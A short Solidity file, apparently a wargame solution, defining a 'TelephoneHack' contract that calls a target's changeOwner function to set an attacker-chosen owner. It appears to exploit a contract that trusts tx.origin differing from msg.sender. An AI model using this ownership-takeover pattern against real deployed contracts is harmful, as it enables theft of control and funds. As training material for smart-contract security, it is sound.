pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {

  function changeOwnerHack(address _instance, address _attacker) public {
    Telephone(_instance).changeOwner(_attacker);
  }
}